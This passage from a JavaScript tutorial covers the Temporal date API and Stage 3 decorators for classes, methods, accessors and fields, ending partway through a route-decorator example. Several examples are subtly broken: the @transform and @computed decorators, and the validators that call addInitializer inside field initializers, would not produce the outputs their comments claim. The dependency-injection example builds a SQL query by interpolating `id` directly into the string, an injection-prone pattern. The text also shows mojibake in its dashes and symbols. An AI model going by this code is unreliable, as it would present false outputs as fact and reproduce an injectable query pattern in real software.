// These are the SAME instant! But string comparison would say tokyo > ny

// âœ… CORRECT: Compare instants
console.log(tokyo.toInstant().equals(ny.toInstant()));  // true!


// âŒ WRONG: Storing timezone name from user, applying to server time
// User says "America/New_York", server is in UTC
const serverTime = Temporal.Now.plainDateTimeISO();  // Server time!
const wrongZDT = serverTime.toZonedDateTime('America/New_York');  // Wrong timezone applied!

// âœ… CORRECT: Use instant, then convert
const instant = Temporal.Now.instant();
const correctZDT = instant.toZonedDateTimeISO('America/New_York');
```

---

## Summary

| Type | Use Case | Example |
|------|----------|---------|
| **Instant** | Timestamps, logs, precise moments | `Temporal.Now.instant()` |
| **ZonedDateTime** | Display times, scheduling across zones | User's local time |
| **PlainDate** | Birthdays, holidays, date-only data | `2024-06-15` |
| **PlainTime** | Alarms, business hours | `09:00` |
| **PlainDateTime** | Form inputs, local events | `2024-06-15T09:00` |
| **Duration** | Time differences, intervals | `P1Y2M3D` |

### Migration Checklist

- [ ] Replace `new Date()` with `Temporal.Now.instant()` or `Temporal.Now.zonedDateTimeISO()`
- [ ] Replace 0-indexed months with 1-indexed months
- [ ] Replace mutable date operations with immutable `.with()` and `.add()`
- [ ] Replace `getTime()` comparisons with `Temporal.*.compare()`
- [ ] Replace manual duration math with `Duration` objects
- [ ] Store timezones explicitly with `ZonedDateTime`

---

**End of Chapter 20**


# 21-Decorators-S3.md

# 21 Decorators (Stage 3)

---

## Why Decorators Matter

Decorators are **metaprogramming** â€” code that writes code. They let you modify class behavior declaratively, without cluttering your business logic.

### The Problem Decorators Solve

```javascript
// âŒ WITHOUT DECORATORS: Cross-cutting concerns pollute business logic

class UserService {
  async getUser(id) {
    // Logging boilerplate
    console.log(`[${new Date().toISOString()}] getUser called with ${id}`);
    const start = Date.now();
    
    try {
      // Caching boilerplate
      const cached = cache.get(`user:${id}`);
      if (cached) return cached;
      
      // Actual business logic (buried in boilerplate!)
      const user = await db.query('SELECT * FROM users WHERE id = ?', [id]);
      
      // More caching boilerplate
      cache.set(`user:${id}`, user, 300);
      
      // Timing boilerplate
      console.log(`getUser took ${Date.now() - start}ms`);
      
      return user;
    } catch (error) {
      // Error handling boilerplate
      console.error(`getUser failed:`, error);
      throw error;
    }
  }
}

// âœ… WITH DECORATORS: Clean separation of concerns

class UserService {
  @logged
  @timed
  @cached({ ttl: 300 })
  async getUser(id) {
    // Pure business logic!
    return await db.query('SELECT * FROM users WHERE id = ?', [id]);
  }
}

// Cross-cutting concerns are declarative, reusable, and testable
```

### When to Use Decorators

| Use Case | Example Decorators |
|----------|-------------------|
| **Logging** | `@logged`, `@timed`, `@trace` |
| **Validation** | `@validate`, `@sanitize`, `@required` |
| **Caching** | `@cached`, `@memoize` |
| **Access Control** | `@authenticated`, `@roles(['admin'])` |
| **Error Handling** | `@retry`, `@fallback`, `@timeout` |
| **Dependency Injection** | `@inject`, `@service`, `@singleton` |
| **Serialization** | `@jsonProperty`, `@expose`, `@exclude` |
| **ORM/Database** | `@entity`, `@column`, `@oneToMany` |

---

**Note:** Decorators are currently a Stage 3 proposal. This document describes the proposed API which may change before final standardization. You'll need TypeScript or Babel to use decorators in current environments.

**TypeScript Configuration:**

```json
{
  "compilerOptions": {
    "experimentalDecorators": false,
    "target": "ES2022"
  }
}
```

**Babel Configuration:**

```json
{
  "plugins": [
    ["@babel/plugin-proposal-decorators", { "version": "2023-05" }]
  ]
}
```

---


## 21.1 Class Decorators

Class decorators can modify or replace the entire class definition.

### Modifying Class Behavior

Class decorators receive the class constructor and can return a new constructor or modify the existing one.

**Basic Class Decorator:**

```javascript
function logged(value, context) {
  if (context.kind === 'class') {
    // Return a new class that extends the original
    return class extends value {
      constructor(...args) {
        console.log(`Creating instance of ${context.name}`);
        super(...args);
      }
    };
  }
}

@logged
class User {
  constructor(name) {
    this.name = name;
  }
}

const user = new User('Alice');
// Logs: "Creating instance of User"
```

**Adding Methods to Class:**

```javascript
function withToString(value, context) {
  if (context.kind === 'class') {
    return class extends value {
      toString() {
        return `${context.name} instance`;
      }
    };
  }
}

@withToString
class Product {
  constructor(name, price) {
    this.name = name;
    this.price = price;
  }
}

const product = new Product('Laptop', 999);
console.log(product.toString()); // "Product instance"
```

**Adding Static Methods:**

```javascript
function withFactory(value, context) {
  if (context.kind === 'class') {
    // Add static factory method
    value.create = function(...args) {
      console.log('Creating via factory');
      return new value(...args);
    };
  }
  return value;
}

@withFactory
class Widget {
  constructor(id) {
    this.id = id;
  }
}

const widget = Widget.create(123);
console.log(widget.id); // 123
```

**Registry Pattern:**

```javascript
const registry = new Map();

function register(value, context) {
  if (context.kind === 'class') {
    registry.set(context.name, value);
    console.log(`Registered class: ${context.name}`);
  }
  return value;
}

@register
class Service {
  doWork() {
    return 'working';
  }
}

@register
class Controller {
  handleRequest() {
    return 'handled';
  }
}

// Access registered classes
console.log(registry.get('Service')); // Service class
console.log(registry.get('Controller')); // Controller class

// Factory pattern
function createInstance(className, ...args) {
  const Class = registry.get(className);
  return Class ? new Class(...args) : null;
}

const service = createInstance('Service');
console.log(service.doWork()); // "working"
```

**Validation Decorator:**

```javascript
function validateConstructor(value, context) {
  if (context.kind === 'class') {
    return class extends value {
      constructor(...args) {
        // Validate arguments
        if (args.length === 0) {
          throw new Error(`${context.name} requires arguments`);
        }
        super(...args);
      }
    };
  }
}

@validateConstructor
class Account {
  constructor(accountNumber) {
    this.accountNumber = accountNumber;
  }
}

const account = new Account('12345'); // OK
// const invalid = new Account(); // Error: Account requires arguments
```

**Singleton Pattern:**

```javascript
function singleton(value, context) {
  if (context.kind === 'class') {
    let instance;
    
    return class extends value {
      constructor(...args) {
        if (instance) {
          return instance;
        }
        super(...args);
        instance = this;
      }
    };
  }
}

@singleton
class Database {
  constructor(connectionString) {
    this.connectionString = connectionString;
  }
}

const db1 = new Database('mysql://localhost');
const db2 = new Database('postgres://localhost');

console.log(db1 === db2); // true (same instance)
console.log(db1.connectionString); // "mysql://localhost"
```

**Metadata Collection:**

```javascript
const metadata = new WeakMap();

function collectMetadata(value, context) {
  if (context.kind === 'class') {
    // Store metadata about the class
    metadata.set(value, {
      name: context.name,
      createdAt: new Date(),
      version: '1.0.0'
    });
  }
  return value;
}

@collectMetadata
class Component {
  render() {
    return '<div>Component</div>';
  }
}

console.log(metadata.get(Component));
// { name: 'Component', createdAt: Date, version: '1.0.0' }
```

**Freezing/Sealing Classes:**

```javascript
function frozen(value, context) {
  if (context.kind === 'class') {
    return class extends value {
      constructor(...args) {
        super(...args);
        Object.freeze(this);
      }
    };
  }
}

@frozen
class ImmutablePoint {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }
}

const point = new ImmutablePoint(10, 20);
point.x = 100; // Silently fails (or throws in strict mode)
console.log(point.x); // 10 (unchanged)
```

---

## 21.2 Method Decorators

Method decorators can modify method behavior, add logging, validation, or completely replace methods.

### Modifying Methods

Method decorators receive the original method and can return a replacement function.

**Basic Method Decorator:**

```javascript
function log(value, context) {
  if (context.kind === 'method') {
    return function(...args) {
      console.log(`Calling ${context.name} with:`, args);
      const result = value.apply(this, args);
      console.log(`${context.name} returned:`, result);
      return result;
    };
  }
}

class Calculator {
  @log
  add(a, b) {
    return a + b;
  }
  
  @log
  multiply(a, b) {
    return a * b;
  }
}

const calc = new Calculator();
calc.add(5, 3);
// Logs: "Calling add with: [5, 3]"
// Logs: "add returned: 8"
```

**Timing/Performance Decorator:**

```javascript
function measure(value, context) {
  if (context.kind === 'method') {
    return function(...args) {
      const start = performance.now();
      const result = value.apply(this, args);
      const end = performance.now();
      
      console.log(`${context.name} took ${(end - start).toFixed(2)}ms`);
      return result;
    };
  }
}

class DataProcessor {
  @measure
  processLargeDataset(data) {
    // Simulate expensive operation
    return data.map(x => x * 2).reduce((a, b) => a + b, 0);
  }
}

const processor = new DataProcessor();
const data = Array.from({ length: 1000000 }, (_, i) => i);
processor.processLargeDataset(data);
// Logs: "processLargeDataset took 45.23ms"
```

**Memoization Decorator:**

```javascript
function memoize(value, context) {
  if (context.kind === 'method') {
    const cache = new Map();
    
    return function(...args) {
      const key = JSON.stringify(args);
      
      if (cache.has(key)) {
        console.log(`Cache hit for ${context.name}`);
        return cache.get(key);
      }
      
      console.log(`Computing ${context.name}`);
      const result = value.apply(this, args);
      cache.set(key, result);
      return result;
    };
  }
}

class MathUtils {
  @memoize
  fibonacci(n) {
    if (n <= 1) return n;
    return this.fibonacci(n - 1) + this.fibonacci(n - 2);
  }
  
  @memoize
  factorial(n) {
    if (n <= 1) return 1;
    return n * this.factorial(n - 1);
  }
}

const math = new MathUtils();
console.log(math.fibonacci(10)); // Computes
console.log(math.fibonacci(10)); // Cache hit
```

**Validation Decorator:**

```javascript
function validate(schema) {
  return function(value, context) {
    if (context.kind === 'method') {
      return function(...args) {
        // Validate arguments
        for (let i = 0; i < schema.length; i++) {
          const validator = schema[i];
          if (!validator(args[i])) {
            throw new TypeError(
              `Argument ${i} of ${context.name} failed validation`
            );
          }
        }
        
        return value.apply(this, args);
      };
    }
  };
}

// Validators
const isString = (val) => typeof val === 'string';
const isNumber = (val) => typeof val === 'number';
const isPositive = (val) => typeof val === 'number' && val > 0;

class UserService {
  @validate([isString, isPositive])
  createUser(name, age) {
    return { name, age };
  }
  
  @validate([isNumber, isNumber])
  calculateTotal(price, quantity) {
    return price * quantity;
  }
}

const service = new UserService();
service.createUser('Alice', 30); // OK
// service.createUser('Bob', -5); // Error: Argument 1 failed validation
```

**Retry Decorator:**

```javascript
function retry(maxAttempts = 3, delay = 1000) {
  return function(value, context) {
    if (context.kind === 'method') {
      return async function(...args) {
        let lastError;
        
        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
          try {
            console.log(`Attempt ${attempt} of ${context.name}`);
            return await value.apply(this, args);
          } catch (error) {
            lastError = error;
            console.log(`Attempt ${attempt} failed:`, error.message);
            
            if (attempt < maxAttempts) {
              await new Promise(resolve => setTimeout(resolve, delay));
            }
          }
        }
        
        throw lastError;
      };
    }
  };
}

class ApiClient {
  @retry(3, 500)
  async fetchData(url) {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    return response.json();
  }
}
```

**Deprecation Warning:**

```javascript
function deprecated(message) {
  return function(value, context) {
    if (context.kind === 'method') {
      return function(...args) {
        console.warn(
          `Warning: ${context.name} is deprecated. ${message}`
        );
        return value.apply(this, args);
      };
    }
  };
}

class LegacyApi {
  @deprecated('Use newMethod() instead')
  oldMethod() {
    return 'old result';
  }
  
  newMethod() {
    return 'new result';
  }
}

const api = new LegacyApi();
api.oldMethod();
// Warning: oldMethod is deprecated. Use newMethod() instead
```

**Debounce/Throttle Decorator:**

```javascript
function debounce(delay) {
  return function(value, context) {
    if (context.kind === 'method') {
      let timeoutId;
      
      return function(...args) {
        clearTimeout(timeoutId);
        
        timeoutId = setTimeout(() => {
          value.apply(this, args);
        }, delay);
      };
    }
  };
}

function throttle(delay) {
  return function(value, context) {
    if (context.kind === 'method') {
      let lastCall = 0;
      
      return function(...args) {
        const now = Date.now();
        
        if (now - lastCall >= delay) {
          lastCall = now;
          return value.apply(this, args);
        }
      };
    }
  };
}

class SearchBox {
  @debounce(300)
  onSearchInput(query) {
    console.log('Searching for:', query);
    // Perform search
  }
  
  @throttle(1000)
  onScroll(position) {
    console.log('Scrolled to:', position);
    // Handle scroll
  }
}
```

---

## 21.3 Accessor Decorators

Accessor decorators can modify getters and setters, adding validation, logging, or computed properties.

### Modifying Getters/Setters

Accessor decorators work with getter and setter methods.

**Basic Accessor Decorator:**

```javascript
function logged(value, context) {
  if (context.kind === 'getter') {
    return function() {
      const result = value.call(this);
      console.log(`Getting ${context.name}:`, result);
      return result;
    };
  }
  
  if (context.kind === 'setter') {
    return function(val) {
      console.log(`Setting ${context.name}:`, val);
      return value.call(this, val);
    };
  }
}

class Person {
  #name = '';
  
  @logged
  get name() {
    return this.#name;
  }
  
  @logged
  set name(value) {
    this.#name = value;
  }
}

const person = new Person();
person.name = 'Alice'; // Logs: "Setting name: Alice"
console.log(person.name); // Logs: "Getting name: Alice"
```

**Validation in Setter:**

```javascript
function range(min, max) {
  return function(value, context) {
    if (context.kind === 'setter') {
      return function(val) {
        if (val < min || val > max) {
          throw new RangeError(
            `${context.name} must be between ${min} and ${max}`
          );
        }
        return value.call(this, val);
      };
    }
    return value;
  };
}

class Temperature {
  #celsius = 0;
  
  @range(-273.15, 1000)
  set celsius(value) {
    this.#celsius = value;
  }
  
  get celsius() {
    return this.#celsius;
  }
  
  get fahrenheit() {
    return (this.#celsius * 9/5) + 32;
  }
}

const temp = new Temperature();
temp.celsius = 25; // OK
// temp.celsius = -300; // Error: celsius must be between -273.15 and 1000
```

**Computed Property Caching:**

```javascript
function cached(value, context) {
  if (context.kind === 'getter') {
    const cacheKey = Symbol(`cached_${context.name}`);
    
    return function() {
      if (!this.hasOwnProperty(cacheKey)) {
        console.log(`Computing ${context.name}`);
        Object.defineProperty(this, cacheKey, {
          value: value.call(this),
          writable: false,
          enumerable: false
        });
      } else {
        console.log(`Using cached ${context.name}`);
      }
      return this[cacheKey];
    };
  }
}

class DataAnalyzer {
  constructor(data) {
    this.data = data;
  }
  
  @cached
  get average() {
    // Expensive computation
    return this.data.reduce((a, b) => a + b, 0) / this.data.length;
  }
  
  @cached
  get standardDeviation() {
    const avg = this.average;
    const squareDiffs = this.data.map(x => Math.pow(x - avg, 2));
    return Math.sqrt(squareDiffs.reduce((a, b) => a + b) / this.data.length);
  }
}

const analyzer = new DataAnalyzer([1, 2, 3, 4, 5]);
console.log(analyzer.average); // Computes
console.log(analyzer.average); // Uses cached
console.log(analyzer.standardDeviation); // Computes (uses cached average)
```

**Read-only Property:**

```javascript
function readonly(value, context) {
  if (context.kind === 'setter') {
    return function(val) {
      throw new Error(`${context.name} is read-only`);
    };
  }
  return value;
}

class Configuration {
  #apiKey = 'secret-key';
  
  get apiKey() {
    return this.#apiKey;
  }
  
  @readonly
  set apiKey(value) {
    this.#apiKey = value;
  }
}

const config = new Configuration();
console.log(config.apiKey); // "secret-key"
// config.apiKey = 'new-key'; // Error: apiKey is read-only
```

**Type Coercion:**

```javascript
function coerce(type) {
  return function(value, context) {
    if (context.kind === 'setter') {
      return function(val) {
        let coerced;
        
        switch (type) {
          case 'string':
            coerced = String(val);
            break;
          case 'number':
            coerced = Number(val);
            break;
          case 'boolean':
            coerced = Boolean(val);
            break;
          default:
            coerced = val;
        }
        
        return value.call(this, coerced);
      };
    }
    return value;
  };
}

class FormData {
  #age;
  #active;
  
  @coerce('number')
  set age(value) {
    this.#age = value;
  }
  
  get age() {
    return this.#age;
  }
  
  @coerce('boolean')
  set active(value) {
    this.#active = value;
  }
  
  get active() {
    return this.#active;
  }
}

const form = new FormData();
form.age = '25'; // Coerced to number
form.active = 'yes'; // Coerced to boolean

console.log(typeof form.age); // "number"
console.log(typeof form.active); // "boolean"
console.log(form.active); // true
```

---

## 21.4 Field Decorators

Field decorators can modify class fields, adding initialization logic or validation.

### Modifying Class Fields

Field decorators receive an initialization function that can transform the field value.

**Basic Field Decorator:**

```javascript
function logged(value, context) {
  if (context.kind === 'field') {
    return function(initialValue) {
      console.log(`Initializing ${context.name} with:`, initialValue);
      return initialValue;
    };
  }
}

class User {
  @logged
  name = 'Anonymous';
  
  @logged
  age = 0;
}

const user = new User();
// Logs: "Initializing name with: Anonymous"
// Logs: "Initializing age with: 0"
```

**Default Values:**

```javascript
function withDefault(defaultValue) {
  return function(value, context) {
    if (context.kind === 'field') {
      return function(initialValue) {
        return initialValue ?? defaultValue;
      };
    }
  };
}

class Config {
  @withDefault('localhost')
  host;
  
  @withDefault(3000)
  port;
  
  @withDefault(true)
  debug;
}

const config = new Config();
console.log(config.host); // "localhost"
console.log(config.port); // 3000
console.log(config.debug); // true

const customConfig = new Config();
customConfig.host = 'example.com';
console.log(customConfig.host); // "example.com"
```

**Validation on Initialization:**

```javascript
function validate(validator, message) {
  return function(value, context) {
    if (context.kind === 'field') {
      return function(initialValue) {
        if (!validator(initialValue)) {
          throw new Error(
            `${context.name}: ${message || 'Validation failed'}`
          );
        }
        return initialValue;
      };
    }
  };
}

class Product {
  @validate(val => typeof val === 'string' && val.length > 0, 'Name is required')
  name = 'Unknown';
  
  @validate(val => typeof val === 'number' && val > 0, 'Price must be positive')
  price = 0;
}

const product = new Product();
product.name = 'Laptop'; // OK
// product.price = -10; // Would throw during initialization if set in constructor
```

**Transformation Decorator:**

```javascript
function transform(transformer) {
  return function(value, context) {
    if (context.kind === 'field') {
      return function(initialValue) {
        return transformer(initialValue);
      };
    }
  };
}

class Article {
  @transform(val => val.toUpperCase())
  title = '';
  
  @transform(val => val.trim())
  content = '';
  
  @transform(val => new Date(val))
  publishedAt = Date.now();
}

const article = new Article();
article.title = 'hello world';
console.log(article.title); // "HELLO WORLD"

article.content = '  some content  ';
console.log(article.content); // "some content"
```

**Observable Field:**

```javascript
function observable(value, context) {
  if (context.kind === 'field') {
    const observers = new Set();
    const fieldName = context.name;
    
    // Add observer methods during class initialization
    context.addInitializer(function() {
      this[`observe_${fieldName}`] = function(callback) {
        observers.add(callback);
      };
      
      this[`unobserve_${fieldName}`] = function(callback) {
        observers.delete(callback);
      };
    });
    
    return function(initialValue) {
      let currentValue = initialValue;
      
      // Define getter and setter
      Object.defineProperty(this, fieldName, {
        get() {
          return currentValue;
        },
        set(newValue) {
          const oldValue = currentValue;
          currentValue = newValue;
          
          // Notify observers
          observers.forEach(callback => {
            callback(newValue, oldValue);
          });
        },
        enumerable: true,
        configurable: true
      });
      
      return currentValue;
    };
  }
}

class Model {
  @observable
  data = null;
}

const model = new Model();

model.observe_data((newVal, oldVal) => {
  console.log('Data changed:', oldVal, '->', newVal);
});

model.data = 'first';  // Logs: "Data changed: null -> first"
model.data = 'second'; // Logs: "Data changed: first -> second"
```

**Metadata Decoration:**

```javascript
const fieldMetadata = new WeakMap();

function metadata(meta) {
  return function(value, context) {
    if (context.kind === 'field') {
      context.addInitializer(function() {
        if (!fieldMetadata.has(this.constructor)) {
          fieldMetadata.set(this.constructor, {});
        }
        
        const classMetadata = fieldMetadata.get(this.constructor);
        classMetadata[context.name] = meta;
      });
    }
    return value;
  };
}

class UserModel {
  @metadata({ required: true, type: 'string', maxLength: 100 })
  username;
  
  @metadata({ required: true, type: 'email' })
  email;
  
  @metadata({ required: false, type: 'number', min: 0, max: 150 })
  age;
}

const user = new UserModel();
console.log(fieldMetadata.get(UserModel));
// {
//   username: { required: true, type: 'string', maxLength: 100 },
//   email: { required: true, type: 'email' },
//   age: { required: false, type: 'number', min: 0, max: 150 }
// }
```

---

## 21.5 Auto-accessor Decorators

Auto-accessors combine getter and setter into a single declaration using the `accessor` keyword.

### Combined Getter/Setter Decorators

Auto-accessors create a private backing field with public getter and setter.

**Basic Auto-accessor:**

```javascript
class Person {
  // Auto-accessor creates private field and public getter/setter
  accessor name = 'Anonymous';
  
  // Equivalent to:
  // #name = 'Anonymous';
  // get name() { return this.#name; }
  // set name(value) { this.#name = value; }
}

const person = new Person();
console.log(person.name); // "Anonymous"
person.name = 'Alice';
console.log(person.name); // "Alice"
```

**Decorating Auto-accessors:**

```javascript
function logged(value, context) {
  if (context.kind === 'accessor') {
    // value is { get, set }
    return {
      get() {
        const result = value.get.call(this);
        console.log(`Getting ${context.name}:`, result);
        return result;
      },
      set(val) {
        console.log(`Setting ${context.name}:`, val);
        value.set.call(this, val);
      }
    };
  }
}

class User {
  @logged
  accessor username = 'guest';
  
  @logged
  accessor email = '';
}

const user = new User();
user.username = 'alice'; // Logs: "Setting username: alice"
console.log(user.username); // Logs: "Getting username: alice"
```

**Validation Auto-accessor:**

```javascript
function validated(validator) {
  return function(value, context) {
    if (context.kind === 'accessor') {
      return {
        get() {
          return value.get.call(this);
        },
        set(val) {
          if (!validator(val)) {
            throw new Error(
              `Invalid value for ${context.name}: ${val}`
            );
          }
          value.set.call(this, val);
        }
      };
    }
  };
}

const isEmail = (val) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
const isPositive = (val) => typeof val === 'number' && val > 0;

class Account {
  @validated(isEmail)
  accessor email = '';
  
  @validated(isPositive)
  accessor balance = 0;
}

const account = new Account();
account.email = 'alice@example.com'; // OK
// account.email = 'invalid'; // Error: Invalid value for email

account.balance = 100; // OK
// account.balance = -50; // Error: Invalid value for balance
```

**Reactive Auto-accessor:**

```javascript
function reactive(value, context) {
  if (context.kind === 'accessor') {
    const listeners = new Set();
    
    // Add subscription methods
    context.addInitializer(function() {
      this[`on${context.name}Change`] = function(callback) {
        listeners.add(callback);
        return () => listeners.delete(callback);
      };
    });
    
    return {
      get() {
        return value.get.call(this);
      },
      set(newVal) {
        const oldVal = value.get.call(this);
        value.set.call(this, newVal);
        
        // Notify listeners
        if (oldVal !== newVal) {
          listeners.forEach(callback => callback(newVal, oldVal));
        }
      }
    };
  }
}

class Store {
  @reactive
  accessor count = 0;
  
  @reactive
  accessor message = '';
}

const store = new Store();

// Subscribe to changes
const unsubscribe = store.oncountChange((newVal, oldVal) => {
  console.log(`Count changed: ${oldVal} -> ${newVal}`);
});

store.count = 5;  // Logs: "Count changed: 0 -> 5"
store.count = 10; // Logs: "Count changed: 5 -> 10"

unsubscribe(); // Stop listening
store.count = 15; // No log
```

**Computed Auto-accessor:**

```javascript
function computed(dependencies) {
  return function(value, context) {
    if (context.kind === 'accessor') {
      // Cache the computed value
      let cachedValue;
      let dirty = true;
      
      context.addInitializer(function() {
        // Watch dependencies
        dependencies.forEach(dep => {
          const original = Object.getOwnPropertyDescriptor(
            this.constructor.prototype, 
            dep
          );
          
          if (original && original.set) {
            const originalSet = original.set;
            Object.defineProperty(this, dep, {
              ...original,
              set(val) {
                dirty = true;
                originalSet.call(this, val);
              }
            });
          }
        });
      });
      
      return {
        get() {
          if (dirty) {
            cachedValue = value.get.call(this);
            dirty = false;
          }
          return cachedValue;
        },
        set() {
          throw new Error(`${context.name} is computed and cannot be set`);
        }
      };
    }
  };
}

class Rectangle {
  accessor width = 0;
  accessor height = 0;
  
  @computed(['width', 'height'])
  accessor area = function() {
    console.log('Computing area');
    return this.width * this.height;
  };
}

const rect = new Rectangle();
rect.width = 10;
rect.height = 5;

console.log(rect.area); // Computes: 50
console.log(rect.area); // Cached: 50

rect.width = 20;
console.log(rect.area); // Recomputes: 100
```

**Type Coercion Auto-accessor:**

```javascript
function coerceType(type) {
  return function(value, context) {
    if (context.kind === 'accessor') {
      return {
        get() {
          return value.get.call(this);
        },
        set(val) {
          let coerced;
          
          switch (type) {
            case 'string':
              coerced = String(val);
              break;
            case 'number':
              coerced = Number(val);
              if (isNaN(coerced)) {
                throw new TypeError(`Cannot coerce to number: ${val}`);
              }
              break;
            case 'boolean':
              coerced = Boolean(val);
              break;
            case 'date':
              coerced = new Date(val);
              if (isNaN(coerced.getTime())) {
                throw new TypeError(`Cannot coerce to date: ${val}`);
              }
              break;
            default:
              coerced = val;
          }
          
          value.set.call(this, coerced);
        }
      };
    }
  };
}

class FormModel {
  @coerceType('string')
  accessor name = '';
  
  @coerceType('number')
  accessor age = 0;
  
  @coerceType('boolean')
  accessor active = false;
  
  @coerceType('date')
  accessor birthDate = new Date();
}

const form = new FormModel();
form.name = 123; // Coerced to "123"
form.age = '25'; // Coerced to 25
form.active = 'yes'; // Coerced to true
form.birthDate = '2000-01-01'; // Coerced to Date

console.log(typeof form.name); // "string"
console.log(typeof form.age); // "number"
console.log(typeof form.active); // "boolean"
console.log(form.birthDate instanceof Date); // true
```

**Bound Auto-accessor:**

```javascript
function bound(value, context) {
  if (context.kind === 'accessor') {
    context.addInitializer(function() {
      // Bind getter and setter to instance
      const boundGet = value.get.bind(this);
      const boundSet = value.set.bind(this);
      
      Object.defineProperty(this, context.name, {
        get: boundGet,
        set: boundSet,
        enumerable: true,
        configurable: true
      });
    });
  }
  return value;
}

class Component {
  @bound
  accessor state = {};
  
  render() {
    const { state } = this; // Destructuring works
    console.log('Rendering with state:', state);
  }
}

const component = new Component();
component.state = { count: 0 };
component.render(); // Works correctly
```

---

## Combining Multiple Decorators

Decorators can be stacked, applying transformations in order.

**Multiple Decorators:**

```javascript
function uppercase(value, context) {
  if (context.kind === 'accessor') {
    return {
      get() {
        return value.get.call(this);
      },
      set(val) {
        value.set.call(this, String(val).toUpperCase());
      }
    };
  }
}

function trimmed(value, context) {
  if (context.kind === 'accessor') {
    return {
      get() {
        return value.get.call(this);
      },
      set(val) {
        value.set.call(this, String(val).trim());
      }
    };
  }
}

function logged(value, context) {
  if (context.kind === 'accessor') {
    return {
      get() {
        const result = value.get.call(this);
        console.log(`Get ${context.name}:`, result);
        return result;
      },
      set(val) {
        console.log(`Set ${context.name}:`, val);
        value.set.call(this, val);
      }
    };
  }
}

class TextInput {
  @logged
  @trimmed
  @uppercase
  accessor text = '';
}

const input = new TextInput();
input.text = '  hello  ';
// Logs: "Set text:   hello  "
// Applied: trimmed -> "hello"
// Applied: uppercase -> "HELLO"

console.log(input.text);
// Logs: "Get text: HELLO"
// Returns: "HELLO"
```

---

## 21.6 Dependency Injection with Decorators

Decorators are perfect for implementing Dependency Injection (DI) â€” a pattern where classes receive their dependencies from the outside rather than creating them internally.

### Simple DI Container

```javascript
// A basic DI container using decorators
const container = new Map();
const dependencies = new WeakMap();

// Register a class as injectable
function injectable(value, context) {
  if (context.kind === 'class') {
    container.set(context.name, value);
    return value;
  }
}

// Mark a field for injection
function inject(serviceName) {
  return function(value, context) {
    if (context.kind === 'field') {
      return function() {
        const Service = container.get(serviceName);
        if (!Service) throw new Error(`Service ${serviceName} not registered`);
        return new Service();
      };
    }
  };
}

// Usage
@injectable
class Logger {
  log(msg) {
    console.log(`[LOG] ${msg}`);
  }
}

@injectable
class Database {
  query(sql) {
    return `Query result for: ${sql}`;
  }
}

class UserService {
  @inject('Logger')
  logger;
  
  @inject('Database')
  db;
  
  getUser(id) {
    this.logger.log(`Getting user ${id}`);
    return this.db.query(`SELECT * FROM users WHERE id = ${id}`);
  }
}

const userService = new UserService();
console.log(userService.getUser(123));
```

### Singleton Pattern

```javascript
// Ensure only one instance exists
const instances = new Map();

function singleton(value, context) {
  if (context.kind === 'class') {
    return new Proxy(value, {
      construct(target, args) {
        if (!instances.has(target)) {
          instances.set(target, new target(...args));
        }
        return instances.get(target);
      }
    });
  }
}

@singleton
class ConfigService {
  constructor() {
    this.config = { env: 'production' };
    console.log('ConfigService created (only once!)');
  }
}

const config1 = new ConfigService();
const config2 = new ConfigService();
console.log(config1 === config2);  // true (same instance)
```

### Scoped Dependencies

```javascript
// Lifetime scopes: singleton, transient, scoped
const lifetimes = new Map();
const scopedInstances = new Map();
let currentScope = null;

function service(lifetime = 'transient') {
  return function(value, context) {
    if (context.kind === 'class') {
      lifetimes.set(context.name, { class: value, lifetime });
      
      return new Proxy(value, {
        construct(target, args) {
          const config = lifetimes.get(context.name);
          
          switch (config.lifetime) {
            case 'singleton':
              if (!instances.has(target)) {
                instances.set(target, new target(...args));
              }
              return instances.get(target);
              
            case 'scoped':
              if (!currentScope) throw new Error('No active scope');
              if (!scopedInstances.get(currentScope)?.has(target)) {
                const scopeMap = scopedInstances.get(currentScope) || new Map();
                scopeMap.set(target, new target(...args));
                scopedInstances.set(currentScope, scopeMap);
              }
              return scopedInstances.get(currentScope).get(target);
              
            case 'transient':
            default:
              return new target(...args);
          }
        }
      });
    }
  };
}

// Create a scope for request handling
function createScope(fn) {
  const scope = Symbol('scope');
  currentScope = scope;
  try {
    return fn();
  } finally {
    scopedInstances.delete(scope);
    currentScope = null;
  }
}

// Usage
@service('singleton')
class AppConfig {}

@service('scoped')
class RequestContext {}

@service('transient')
class Logger {}
```

---

## 21.7 Real-World Decorator Patterns

### Validation Decorators

```javascript
// Field validation using metadata
const validations = new WeakMap();

function required(value, context) {
  if (context.kind === 'field') {
    const existing = validations.get(context) || [];
    existing.push({ type: 'required', field: context.name });
    validations.set(context, existing);
    
    return function(initialValue) {
      return initialValue;
    };
  }
}

function minLength(min) {
  return function(value, context) {
    if (context.kind === 'field') {
      return function(initialValue) {
        // Add validation to setter via addInitializer
        context.addInitializer(function() {
          const original = Object.getOwnPropertyDescriptor(this, context.name);
          Object.defineProperty(this, context.name, {
            set(val) {
              if (typeof val === 'string' && val.length < min) {
                throw new Error(`${context.name} must be at least ${min} characters`);
              }
              this[`_${context.name}`] = val;
            },
            get() {
              return this[`_${context.name}`];
            }
          });
        });
        return initialValue;
      };
    }
  };
}

function email(value, context) {
  if (context.kind === 'field') {
    return function(initialValue) {
      context.addInitializer(function() {
        Object.defineProperty(this, context.name, {
          set(val) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (val && !emailRegex.test(val)) {
              throw new Error(`${context.name} must be a valid email`);
            }
            this[`_${context.name}`] = val;
          },
          get() {
            return this[`_${context.name}`];
          }
        });
      });
      return initialValue;
    };
  }
}

// Usage
class User {
  @required
  @minLength(2)
  name = '';
  
  @required
  @email
  email = '';
}

const user = new User();
user.name = 'AB';      // OK
// user.name = 'A';    // Error: name must be at least 2 characters
user.email = 'test@example.com';  // OK
// user.email = 'invalid';  // Error: email must be a valid email
```

### API Route Decorators (Express-style)

```javascript
// Route metadata collection
const routes = [];

function controller(basePath) {
  return function(value, context) {
    if (context.kind === 'class') {
      context.addInitializer(function() {
        routes.filter(r => r.controller === context.name)
          .forEach(r => r.basePath = basePath);
      });
      return value;
    }
  };
}

function route(method, path) {
  return function(value, context) {
    if (context.kind === 'method') {
      routes.push({
        controller: context.name,
        method: method.toUpperCase(),
        path,
        handler: context.name
      });
      return value;
    }
  };
}

const get = (path) => route('GET', path);
const post = (path) => route('POST', path);
const put = (path) => route('PUT', path);
